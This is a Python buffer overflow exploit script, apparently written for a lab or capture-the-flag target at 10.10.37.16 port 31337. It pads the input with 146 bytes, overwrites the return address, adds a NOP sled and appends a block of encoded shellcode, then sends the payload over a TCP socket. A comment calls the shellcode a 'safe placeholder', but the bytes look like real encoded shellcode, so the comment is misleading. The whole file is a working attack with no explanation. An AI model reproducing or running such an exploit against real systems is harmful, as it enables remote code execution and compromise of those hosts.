import socket
import sys

# Safe placeholder payload (bytes)
buf = b""
buf += b"\xb8\x6f\xa0\xbc\xa0\xd9\xca\xd9\x74\x24\xf4\x5f"
buf += b"\x29\xc9\xb1\x52\x83\xc7\x04\x31\x47\x0e\x03\x28"
buf += b"\xae\x5e\x55\x4a\x46\x1c\x96\xb2\x97\x41\x1e\x57"
buf += b"\xa6\x41\x44\x1c\x99\x71\x0e\x70\x16\xf9\x42\x60"
buf += b"\xad\x8f\x4a\x87\x06\x25\xad\xa6\x97\x16\x8d\xa9"
buf += b"\x1b\x65\xc2\x09\x25\xa6\x17\x48\x62\xdb\xda\x18"
buf += b"\x3b\x97\x49\x8c\x48\xed\x51\x27\x02\xe3\xd1\xd4"
buf += b"\xd3\x02\xf3\x4b\x6f\x5d\xd3\x6a\xbc\xd5\x5a\x74"
buf += b"\xa1\xd0\x15\x0f\x11\xae\xa7\xd9\x6b\x4f\x0b\x24"
buf += b"\x44\xa2\x55\x61\x63\x5d\x20\x9b\x97\xe0\x33\x58"
buf += b"\xe5\x3e\xb1\x7a\x4d\xb4\x61\xa6\x6f\x19\xf7\x2d"
buf += b"\x63\xd6\x73\x69\x60\xe9\x50\x02\x9c\x62\x57\xc4"
buf += b"\x14\x30\x7c\xc0\x7d\xe2\x1d\x51\xd8\x45\x21\x81"
buf += b"\x83\x3a\x87\xca\x2e\x2e\xba\x91\x26\x83\xf7\x29"
buf += b"\xb7\x8b\x80\x5a\x85\x14\x3b\xf4\xa5\xdd\xe5\x03"
buf += b"\xc9\xf7\x52\x9b\x34\xf8\xa2\xb2\xf2\xac\xf2\xac"
buf += b"\xd3\xcc\x98\x2c\xdb\x18\x0e\x7c\x73\xf3\xef\x2c"
buf += b"\x33\xa3\x87\x26\xbc\x9c\xb8\x49\x16\xb5\x53\xb0"
buf += b"\xf1\xb0\xb2\x8d\xb8\xad\xb6\xf1\xab\x71\x3e\x17"
buf += b"\xa1\x99\x16\x80\x5e\x03\x33\x5a\xfe\xcc\xe9\x27"
buf += b"\xc0\x47\x1e\xd8\x8f\xaf\x6b\xca\x78\x40\x26\xb0"
buf += b"\x2f\x5f\x9c\xdc\xac\xf2\x7b\x1c\xba\xee\xd3\x4b"
buf += b"\xeb\xc1\x2d\x19\x01\x7b\x84\x3f\xd8\x1d\xef\xfb"
buf += b"\x07\xde\xee\x02\xc5\x5a\xd5\x14\x13\x62\x51\x40"
buf += b"\xcb\x35\x0f\x3e\xad\xef\xe1\xe8\x67\x43\xa8\x7c"
buf += b"\xf1\xaf\x6b\xfa\xfe\xe5\x1d\xe2\x4f\x50\x58\x1d"
buf += b"\x7f\x34\x6c\x66\x9d\xa4\x93\xbd\x25\xd4\xd9\x9f"
buf += b"\x0c\x7d\x84\x4a\x0d\xe0\x37\xa1\x52\x1d\xb4\x43"
buf += b"\x2b\xda\xa4\x26\x2e\xa6\x62\xdb\x42\xb7\x06\xdb"
buf += b"\xf1\xb8\x02"


# Build the payload
payload = b"A" * 146 + b"\xbf\x16\x04\x08" + b"\x90" * 32 + buf + b"\r\n"

host = "10.10.37.16"  # Use localhost for testing
port = 31337

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print("Sending payload...")
    s.sendall(payload)  # sendall ensures the entire buffer is sent
    data = s.recv(1024)
    print("Received:", data)
    s.close()
    print("Done!")

except Exception as e:
    print("Error:", e)
    sys.exit()
